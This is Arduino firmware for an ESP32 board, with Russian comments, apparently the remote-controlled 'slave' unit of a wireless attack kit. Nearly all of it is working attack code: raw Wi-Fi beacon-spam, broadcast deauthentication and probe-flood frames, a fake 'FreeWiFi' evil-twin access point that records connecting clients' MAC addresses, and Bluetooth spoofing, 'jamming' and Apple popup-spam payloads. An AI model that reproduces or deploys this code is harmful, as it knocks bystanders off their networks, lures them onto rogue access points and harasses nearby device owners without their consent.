#include <WiFi.h>
#include <esp_now.h>
#include <esp_wifi.h>
#if __has_include(<esp_arduino_version.h>)
#include <esp_arduino_version.h>
#endif
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

// ===== НАСТРОЙКИ СВЕТОДИОДА =====
// Большинство плат ESP32-S3 DevKit используют встроенный RGB светодиод WS2812 на пине 38 или обычный LED на пине 2 / 8.
// Мы настроим пин 8 как стандартный зеленый индикатор.
#define LED_PIN 8 

// ===== СТРУКТУРА ДЛЯ ПРИЁМА КОМАНД =====
typedef struct struct_message {
  char command[16];
  char attack[32];
  char logMsg[64];
} struct_message;
struct_message myData;

bool attackRunning = false;
String currentAttack = "";
uint8_t masterMacAddress[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
bool hasMasterMac = false;
int lastStationCount = 0;
bool evilTwinStarted = false;

// Переменные для атак
uint8_t currentChannel = 1;
unsigned long lastAttackActionTime = 0;
unsigned long lastLedBlinkTime = 0;
bool ledState = false;

// Список SSID для Beacon Spam
const char* spamSSIDs[] = {
  "FBI Surveillance Van",
  "Free Public WiFi",
  "Click for Free Bitcoins",
  "Virus_Distribution_Point",
  "5G_TOWER_666_TEST",
  "Get Off My WiFi",
  "Not A Hackers Network",
  "ESPTOOL2_ACTIVE_SCAN",
  "D-Link_DIR-300",
  "ASUS_Router_Setup"
};
const int numSSIDs = sizeof(spamSSIDs) / sizeof(spamSSIDs[0]);
int ssidIndex = 0;

// BLE Jammer и Sour Apple переменные
bool bleJammerInitialized = false;
bool sourAppleInitialized = false;
unsigned long lastAppleSpamTime = 0;

// Apple BLE пейлоады для Sour Apple (AirDrop спам)
const uint8_t applePayloads[][17] = {
  {0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12}, // AirPods Pro
  {0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00}, // AppleTV Setup
  {0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12}, // AirPods 3
  {0x4c, 0x00, 0x0f, 0x05, 0xc0, 0x01, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}  // Action Modal
};
const int numApplePayloads = sizeof(applePayloads) / sizeof(applePayloads[0]);
int applePayloadIndex = 0;

// ===== ОТПРАВКА ЛОГОВ ПО ESP-NOW =====
void sendLogToMaster(const char* logMsg) {
  if (!hasMasterMac) return;
  
  struct_message response;
  strcpy(response.command, "log");
  strcpy(response.attack, "");
  strncpy(response.logMsg, logMsg, sizeof(response.logMsg) - 1);
  response.logMsg[sizeof(response.logMsg) - 1] = '\0';
  
  esp_now_send(masterMacAddress, (uint8_t *)&response, sizeof(response));
}

// ===== УПРАВЛЕНИЕ ИНДИКАТОРОМ (МИГАНИЕ) =====
void updateLedIndicator() {
  if (attackRunning) {
    // Быстрое мигание (раз в 100 мс) во время активной атаки
    if (millis() - lastLedBlinkTime >= 100) {
      lastLedBlinkTime = millis();
      ledState = !ledState;
      digitalWrite(LED_PIN, ledState ? HIGH : LOW);
    }
  } else {
    // В покое светодиод выключен
    digitalWrite(LED_PIN, LOW);
  }
}

// ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
void getMacAddress(uint8_t *mac) {
  WiFi.macAddress(mac);
}

void hopChannel() {
  currentChannel++;
  if (currentChannel > 13) {
    currentChannel = 1;
  }
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}

// ===== ОТПРАВКА RAW BEACON =====
void sendRawBeacon(const char* ssid, uint8_t channel) {
  uint8_t mac[6];
  for (int i = 0; i < 6; i++) {
    mac[i] = random(256);
  }
  mac[0] &= 0xFE; 
  mac[0] |= 0x02; 

  uint8_t ssidLen = strlen(ssid);
  uint8_t packet[128] = {
    0x80, 0x00,                         // Beacon
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // Source
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // BSSID
    0x00, 0x00,                         // Sequence
    
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00,                         // Beacon Interval
    0x11, 0x00,                         // Capability
    
    0x00,                               // Tag: SSID
    ssidLen
  };
  
  int pos = 38;
  memcpy(&packet[pos], ssid, ssidLen);
  pos += ssidLen;

  packet[pos++] = 0x01;
  packet[pos++] = 0x04;
  packet[pos++] = 0x82;
  packet[pos++] = 0x84;
  packet[pos++] = 0x8b;
  packet[pos++] = 0x96;

  packet[pos++] = 0x03;
  packet[pos++] = 0x01;
  packet[pos++] = channel;

  esp_wifi_80211_tx(WIFI_IF_STA, packet, pos, false);
}

// ===== ШАГИ АТАК (НЕБЛОКИРУЮЩИЕ) =====

void runBeaconSpamStep() {
  esp_wifi_set_promiscuous(true);
  
  if (millis() - lastAttackActionTime >= 15) {
    lastAttackActionTime = millis();
    hopChannel();
    sendRawBeacon(spamSSIDs[ssidIndex], currentChannel);
    
    // Каждые 50 отправленных пакетов шлем лог на Master
    if (random(50) == 0) {
      char buf[64];
      snprintf(buf, sizeof(buf), "[Beacon] Спам сети: %s (ch %d)", spamSSIDs[ssidIndex], currentChannel);
      sendLogToMaster(buf);
    }
    
    ssidIndex = (ssidIndex + 1) % numSSIDs;
  }
}

void runDeauthStep() {
  esp_wifi_set_promiscuous(true);
  
  if (millis() - lastAttackActionTime >= 15) {
    lastAttackActionTime = millis();
    hopChannel();

    uint8_t deauthPacket[26] = {
      0xC0, 0x00,
      0x00, 0x00,
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00,
      0x07, 0x00
    };

    uint8_t spoofMac[6];
    for (int i = 0; i < 6; i++) {
      spoofMac[i] = random(256);
    }
    spoofMac[0] &= 0xFE;
    spoofMac[0] |= 0x02;

    memcpy(&deauthPacket[10], spoofMac, 6);
    memcpy(&deauthPacket[16], spoofMac, 6);

    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    
    if (random(40) == 0) {
      char buf[64];
      snprintf(buf, sizeof(buf), "[Deauth] Отправка кадра от MAC: %02X:%02X... (ch %d)", 
               spoofMac[0], spoofMac[1], currentChannel);
      sendLogToMaster(buf);
    }
  }
}

void runProbeFloodStep() {
  esp_wifi_set_promiscuous(true);

  if (millis() - lastAttackActionTime >= 20) {
    lastAttackActionTime = millis();
    hopChannel();

    uint8_t mac[6];
    for (int i = 0; i < 6; i++) {
      mac[i] = random(256);
    }
    mac[0] &= 0xFE;
    mac[0] |= 0x02;

    const char* ssid = "ProbeTest";
    uint8_t ssidLen = strlen(ssid);
    uint8_t probePacket[24 + 2 + 32] = {
      0x40, 0x00,
      0x00, 0x00,
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    };
    memcpy(&probePacket[10], mac, 6);
    memcpy(&probePacket[16], mac, 6);

    int pos = 24;
    probePacket[pos++] = 0x00;
    probePacket[pos++] = ssidLen;
    memcpy(&probePacket[pos], ssid, ssidLen);
    pos += ssidLen;

    esp_wifi_80211_tx(WIFI_IF_STA, probePacket, pos, false);
    
    if (random(40) == 0) {
      sendLogToMaster("[Probe] Затопление запросами сканирования (ch 1-13)");
    }
  }
}

void startWiFiScan() {
  sendLogToMaster("[Scanner] Запуск Wi-Fi сканера...");
  Serial.println("▶️ Wi-Fi Scan запущен");
  int n = WiFi.scanNetworks();
  if (n == 0) {
    sendLogToMaster("[Scanner] Wi-Fi сети не обнаружены");
    Serial.println("Сетей не найдено");
  } else {
    char buf[64];
    snprintf(buf, sizeof(buf), "[Scanner] Найдено Wi-Fi сетей: %d", n);
    sendLogToMaster(buf);
    
    for (int i = 0; i < min(n, 15); i++) {
      snprintf(buf, sizeof(buf), "  -> %s (%d dBm)", WiFi.SSID(i).c_str(), WiFi.RSSI(i));
      sendLogToMaster(buf);
      
      String encType = "OPEN";
      switch(WiFi.encryptionType(i)) {
        case WIFI_AUTH_WPA_PSK: encType = "WPA"; break;
        case WIFI_AUTH_WPA2_PSK: encType = "WPA2"; break;
        case WIFI_AUTH_WPA_WPA2_PSK: encType = "WPA/WPA2"; break;
        case WIFI_AUTH_WPA3_PSK: encType = "WPA3"; break;
        case WIFI_AUTH_WEP: encType = "WEP"; break;
        case WIFI_AUTH_OPEN: encType = "OPEN"; break;
        default: encType = "WPA2"; break;
      }
      
      char structBuf[96];
      snprintf(structBuf, sizeof(structBuf), "[WIFI_DEV]%s|%d|%s", WiFi.SSID(i).c_str(), WiFi.RSSI(i), encType.c_str());
      sendLogToMaster(structBuf);
      delay(50);
    }
  }
  WiFi.scanDelete();
}

void startEvilTwin() {
  Serial.println("▶️ Evil Twin запущен");
  WiFi.softAP("FreeWiFi", NULL, 1, 0, 1);
  sendLogToMaster("[EvilTwin] Создана фальшивая точка доступа 'FreeWiFi' (ch 1)");
}

void runEvilTwinStep() {
  static unsigned long lastCheckTime = 0;
  if (millis() - lastCheckTime >= 2000) {
    lastCheckTime = millis();
    int numStations = WiFi.softAPgetStationNum();
    if (numStations != lastStationCount) {
      lastStationCount = numStations;
      char buf[64];
      snprintf(buf, sizeof(buf), "[EvilTwin] Всего клиентов: %d", numStations);
      sendLogToMaster(buf);
      
      wifi_sta_list_t wifi_sta_list;
      memset(&wifi_sta_list, 0, sizeof(wifi_sta_list));
      esp_wifi_ap_get_sta_list(&wifi_sta_list);
      
      for (int i = 0; i < wifi_sta_list.num; i++) {
        wifi_sta_info_t station = wifi_sta_list.sta[i];
        char macStr[20];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 station.mac[0], station.mac[1], station.mac[2],
                 station.mac[3], station.mac[4], station.mac[5]);
        
        char structBuf[64];
        snprintf(structBuf, sizeof(structBuf), "[EVIL_CLIENT]%s", macStr);
        sendLogToMaster(structBuf);
        delay(20);
      }
    }
  }
}

void startBLEScan() {
  sendLogToMaster("[BLE] Запуск Bluetooth сканера...");
  BLEDevice::deinit();
  BLEDevice::init("");
  BLEScan *pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  BLEScanResults *foundDevices = pBLEScan->start(5, false);
  
  char buf[64];
  snprintf(buf, sizeof(buf), "[BLE] Найдено Bluetooth устройств: %d", foundDevices->getCount());
  sendLogToMaster(buf);
  
  for (int i = 0; i < min((int)foundDevices->getCount(), 15); i++) {
    BLEAdvertisedDevice device = foundDevices->getDevice(i);
    String devName = device.haveName() ? device.getName().c_str() : device.getAddress().toString().c_str();
    
    snprintf(buf, sizeof(buf), "  -> %s (%d RSSI)", devName.c_str(), device.getRSSI());
    sendLogToMaster(buf);
    
    char structBuf[96];
    snprintf(structBuf, sizeof(structBuf), "[BLE_DEV]%s|%d", devName.c_str(), device.getRSSI());
    sendLogToMaster(structBuf);
    delay(50);
  }
  pBLEScan->clearResults();
}

void startBLESpoofer() {
  Serial.println("▶️ BLE Spoofer запущен");
  BLEDevice::deinit();
  BLEDevice::init("ESP32-S3");
  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
  BLEAdvertisementData advertisementData;
  advertisementData.setName("BLE_Spoofer");
  advertisementData.setFlags(0x06);

  uint8_t manufData[] = {0x4C, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05};
  String manufString = "";
  for (int i = 0; i < sizeof(manufData); i++) {
    manufString += (char)manufData[i];
  }
  advertisementData.setManufacturerData(manufString);

  pAdvertising->setAdvertisementData(advertisementData);
  pAdvertising->start();
  sendLogToMaster("[BLE] Запущен спуфер (виден как BLE_Spoofer)");
}

void runBLEJammerStep() {
  if (!bleJammerInitialized) {
    Serial.println("▶️ BLE Jammer запущен");
    BLEDevice::deinit();
    BLEDevice::init("");
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData data;
    data.setName("JAMMER");
    data.setFlags(0x06);
    pAdvertising->setAdvertisementData(data);
    pAdvertising->start();
    bleJammerInitialized = true;
    sendLogToMaster("[BLE Jammer] Шум излучается непрерывно");
  }
  delay(10);
}

void runSourAppleStep() {
  if (!sourAppleInitialized) {
    Serial.println("▶️ Sour Apple запущен");
    BLEDevice::deinit();
    BLEDevice::init("Apple");
    sourAppleInitialized = true;
    lastAppleSpamTime = 0;
    sendLogToMaster("[Apple Spam] Начало спама всплывающими окнами (300ms)");
  }

  if (millis() - lastAppleSpamTime >= 300) {
    lastAppleSpamTime = millis();
    
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->stop();

    BLEAdvertisementData advData;
    advData.setFlags(0x04);

    const uint8_t *payload = applePayloads[applePayloadIndex];
    String appleString = "";
    for (int i = 0; i < 17; i++) {
      appleString += (char)payload[i];
    }
    advData.setManufacturerData(appleString);

    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    
    if (applePayloadIndex == 0) sendLogToMaster("[Apple Spam] Пакет: AirDrop/AirPods Pro");
    else if (applePayloadIndex == 1) sendLogToMaster("[Apple Spam] Пакет: AppleTV Setup");
    else if (applePayloadIndex == 3) sendLogToMaster("[Apple Spam] Пакет: Action Modal");
    
    applePayloadIndex = (applePayloadIndex + 1) % numApplePayloads;
  }
}

// ===== ЗАГЛУШКИ ДЛЯ МОДУЛЕЙ =====
void startGhzScan() { sendLogToMaster("[Error] 2.4GHz Scanner требует NRF24"); }
void startProtokill() { sendLogToMaster("[Error] Protokill требует NRF24"); }
void startSubGhzReplay() { sendLogToMaster("[Error] Sub-GHz Replay требует CC1101"); }
void startSubGhzJammer() { sendLogToMaster("[Error] Sub-GHz Jammer требует CC1101"); }
void startIRReplay() { sendLogToMaster("[Error] IR Replay требует IR-диод"); }

// ===== ВОССТАНОВЛЕНИЕ СОСТОЯНИЯ WI-FI =====
void restoreWiFiState() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  WiFi.setSleep(false);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);
}

// ===== ОСТАНОВКА АТАК =====
void stopAttack() {
  attackRunning = false;
  currentAttack = "";
  bleJammerInitialized = false;
  sourAppleInitialized = false;
  evilTwinStarted = false;
  lastStationCount = 0;

  WiFi.softAPdisconnect(true);
  if (BLEDevice::getAdvertising()) {
    BLEDevice::getAdvertising()->stop();
  }
  BLEDevice::deinit();
  esp_wifi_set_promiscuous(false);
  restoreWiFiState();
  digitalWrite(LED_PIN, LOW); // Отключаем диод
  
  sendLogToMaster("⏹️ Все атаки на Slave остановлены. Переход в режим ожидания.");
  Serial.println("⏹️ Все атаки остановлены");
}

// ===== ОТПРАВКА PONG НА MASTER =====
void sendPong(const uint8_t *masterMac) {
  esp_now_peer_info_t peer;
  memset(&peer, 0, sizeof(peer));
  memcpy(peer.peer_addr, masterMac, 6);
  peer.channel = 1;
  peer.encrypt = false;
  
  if (!esp_now_is_peer_exist(masterMac)) {
    esp_now_add_peer(&peer);
  }
  
  struct_message response;
  strcpy(response.command, "pong");
  strcpy(response.attack, "");
  memset(response.logMsg, 0, sizeof(response.logMsg));
  esp_now_send(masterMac, (uint8_t *)&response, sizeof(response));
}

// ===== ОБРАБОТЧИК ESP-NOW =====
#if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
void OnDataRecv(const esp_now_recv_info_t *info, const uint8_t *incomingData, int len) {
  const uint8_t *srcMac = info->src_addr;
#else
void OnDataRecv(const uint8_t *mac_addr, const uint8_t *incomingData, int len) {
  const uint8_t *srcMac = mac_addr;
#endif
  if (len != sizeof(myData)) {
    Serial.printf("⚠️ Неверная длина пакета: %d\n", len);
    return;
  }
  memcpy(&myData, incomingData, sizeof(myData));
  myData.command[15] = '\0';
  myData.attack[31] = '\0';

  // Сохраняем MAC Master-платы для обратных логов
  if (!hasMasterMac || memcmp(masterMacAddress, srcMac, 6) != 0) {
    memcpy(masterMacAddress, srcMac, 6);
    hasMasterMac = true;
    Serial.printf("🔗 Зарегистрирован Master MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  srcMac[0], srcMac[1], srcMac[2], srcMac[3], srcMac[4], srcMac[5]);
  }

  if (strcmp(myData.command, "ping") == 0) {
    Serial.println("📩 Получен PING от MASTER, отправляю PONG...");
    sendPong(srcMac);
    return;
  }

  Serial.print("📩 Получено: команда ");
  Serial.print(myData.command);
  Serial.print(" | атака ");
  Serial.println(myData.attack);

  if (strcmp(myData.command, "start") == 0) {
    if (attackRunning) {
      sendLogToMaster("[Warning] Попытка запуска при уже активной атаке");
      Serial.println("⚠️ Атака уже запущена");
      return;
    }
    attackRunning = true;
    currentAttack = String(myData.attack);
    
    char buf[64];
    snprintf(buf, sizeof(buf), "▶️ Запуск задачи: %s", myData.attack);
    sendLogToMaster(buf);
  } else if (strcmp(myData.command, "stop") == 0) {
    stopAttack();
  } else {
    Serial.println("❌ Неизвестная команда");
  }
}

// ===== SETUP =====
void setup() {
  Serial.begin(115200);
  
  // Конфигурируем пин светодиода на вывод
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  WiFi.setSleep(false);

  // Канал 1 для стабильного приема ESP-NOW
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);

  if (esp_now_init() != ESP_OK) {
    Serial.println("❌ ESP-NOW ошибка инициализации");
    return;
  }
  esp_now_register_recv_cb((esp_now_recv_cb_t)OnDataRecv);
  Serial.println("✅ SLAVE готов к приёму команд");
  Serial.print("📡 Мой MAC: ");
  Serial.println(WiFi.macAddress());
}

// ===== LOOP =====
void loop() {
  updateLedIndicator(); // Мигаем диодом во время атаки
  
  if (attackRunning && currentAttack != "") {
    if (currentAttack == "beacon") {
      runBeaconSpamStep();
    }
    else if (currentAttack == "deauth") {
      runDeauthStep();
    }
    else if (currentAttack == "probe") {
      runProbeFloodStep();
    }
    else if (currentAttack == "wifi_scan") {
      startWiFiScan();
      attackRunning = false;
      currentAttack = "";
      restoreWiFiState();
    }
    else if (currentAttack == "evil_twin") {
      if (!evilTwinStarted) {
        startEvilTwin();
        evilTwinStarted = true;
        lastStationCount = -1;
      }
      runEvilTwinStep();
    }
    else if (currentAttack == "ble_scan") {
      startBLEScan();
      attackRunning = false;
      currentAttack = "";
    }
    else if (currentAttack == "ble_spoofer") {
      startBLESpoofer();
    }
    else if (currentAttack == "ble_jammer") {
      runBLEJammerStep();
    }
    else if (currentAttack == "sour_apple") {
      runSourAppleStep();
    }
    else if (currentAttack == "ghz_scan") { startGhzScan(); attackRunning = false; currentAttack = ""; }
    else if (currentAttack == "protokill") { startProtokill(); attackRunning = false; currentAttack = ""; }
    else if (currentAttack == "subghz_replay") { startSubGhzReplay(); attackRunning = false; currentAttack = ""; }
    else if (currentAttack == "subghz_jammer") { startSubGhzJammer(); attackRunning = false; currentAttack = ""; }
    else if (currentAttack == "ir_replay") { startIRReplay(); attackRunning = false; currentAttack = ""; }
  }
  delay(1);
}
